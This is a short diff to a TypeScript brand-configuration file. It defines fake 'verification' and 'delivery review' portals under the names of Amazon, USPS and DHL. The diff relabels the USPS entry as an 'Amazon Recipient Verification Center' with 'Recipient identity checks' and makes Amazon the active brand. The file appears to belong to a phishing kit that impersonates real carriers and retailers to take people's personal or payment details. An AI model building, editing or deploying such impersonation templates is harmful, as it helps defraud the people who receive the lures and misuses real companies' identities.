@@ -60,12 +60,12 @@ const AMAZON_BRAND: BrandConfig = {
 
 const USPS_BRAND: BrandConfig = {
   id: 'usps',
-  name: 'USPS',
-  portal: 'USPS Delivery Review Center',
-  tagline: 'Tracking. Delivery. Support.',
-  legal: 'USPS delivery review and recipient confirmation portal.',
-  promises: ['Delivery review', 'Recipient confirmation', 'Shipment support'],
-  favicon: '/favicons/usps.png?v=brand-usps-1',
+  name: 'Amazon',
+  portal: 'Amazon Recipient Verification Center',
+  tagline: 'Track. Verify. Deliver.',
+  legal: 'Amazon account and order verification portal.',
+  promises: ['Domestic route checks', 'Recipient identity checks', '24/7 support'],
+  favicon: '/favicon.png?v=brand-10',
   theme: {
     navy: '#11284c',
     panel: '#17386a',
@@ -116,7 +116,7 @@ const DHL_BRAND: BrandConfig = {
   },
 };
 
-const selected = 'usps';
+const selected = 'amazon';
 const BRAND_MAP: Record<string, BrandConfig> = {
   amazon: AMAZON_BRAND,
   usps: USPS_BRAND,
